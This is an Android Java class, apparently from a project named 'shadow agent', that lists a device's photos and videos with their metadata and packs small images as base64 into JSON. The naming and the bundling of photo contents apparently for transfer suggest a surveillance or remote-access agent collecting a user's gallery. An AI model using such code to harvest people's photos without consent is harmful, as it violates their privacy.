package com.shadow.agent;

import android.content.ContentUris;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.MediaStore;
import android.util.Base64;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.InputStream;

public class GalleryHelper {

    private static final String TAG = "SHADOW_GALLERY";
    private final Context context;

    public GalleryHelper(Context context) {
        this.context = context;
    }

    public JSONArray getGallery(int limit, boolean withThumbnail) {
        JSONArray arr = new JSONArray();
        try {
            Uri collection;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                collection = MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL);
            } else {
                collection = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
            }

            String[] projection = new String[]{
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.SIZE,
                MediaStore.Images.Media.DATE_ADDED,
                MediaStore.Images.Media.MIME_TYPE
            };

            Cursor cursor = context.getContentResolver().query(
                collection, projection, null, null,
                MediaStore.Images.Media.DATE_ADDED + " DESC");

            if (cursor != null) {
                int idCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
                int nameCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME);
                int sizeCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE);
                int dateCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED);
                int mimeCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.MIME_TYPE);

                while (cursor.moveToNext() && arr.length() < limit) {
                    long id = cursor.getLong(idCol);
                    Uri contentUri = ContentUris.withAppendedId(collection, id);

                    JSONObject o = new JSONObject();
                    o.put("id", id);
                    o.put("name", cursor.getString(nameCol));
                    o.put("size", cursor.getLong(sizeCol));
                    o.put("date", cursor.getLong(dateCol));
                    o.put("mime", cursor.getString(mimeCol));
                    o.put("uri", contentUri.toString());

                    if (withThumbnail) {
                        try {
                            InputStream is = context.getContentResolver().openInputStream(contentUri);
                            if (is != null) {
                                byte[] bytes = new byte[is.available()];
                                is.read(bytes);
                                is.close();
                                if (bytes.length < 500 * 1024) {
                                    o.put("data", "data:" + cursor.getString(mimeCol) + ";base64,"
                                            + Base64.encodeToString(bytes, Base64.NO_WRAP));
                                } else {
                                    o.put("note", "file terlalu besar, skip");
                                }
                            }
                        } catch (Exception e) {
                            o.put("error_thumb", e.getMessage());
                        }
                    }
                    arr.put(o);
                }
                cursor.close();
            }

        } catch (Exception e) {
            Log.e(TAG, "Gallery error", e);
        }
        return arr;
    }

    public JSONArray getVideoGallery(int limit) {
        JSONArray arr = new JSONArray();
        try {
            Uri collection;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                collection = MediaStore.Video.Media.getContentUri(MediaStore.VOLUME_EXTERNAL);
            } else {
                collection = MediaStore.Video.Media.EXTERNAL_CONTENT_URI;
            }

            String[] projection = new String[]{
                MediaStore.Video.Media._ID,
                MediaStore.Video.Media.DISPLAY_NAME,
                MediaStore.Video.Media.SIZE,
                MediaStore.Video.Media.DURATION,
                MediaStore.Video.Media.DATE_ADDED
            };

            Cursor cursor = context.getContentResolver().query(
                collection, projection, null, null,
                MediaStore.Video.Media.DATE_ADDED + " DESC");

            if (cursor != null) {
                int idCol = cursor.getColumnIndexOrThrow(MediaStore.Video.Media._ID);
                int nameCol = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME);
                int sizeCol = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.SIZE);
                int durCol = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DURATION);
                int dateCol = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DATE_ADDED);

                while (cursor.moveToNext() && arr.length() < limit) {
                    JSONObject o = new JSONObject();
                    o.put("name", cursor.getString(nameCol));
                    o.put("size", cursor.getLong(sizeCol));
                    o.put("duration", cursor.getLong(durCol));
                    o.put("date", cursor.getLong(dateCol));
                    arr.put(o);
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Video gallery error", e);
        }
        return arr;
    }
}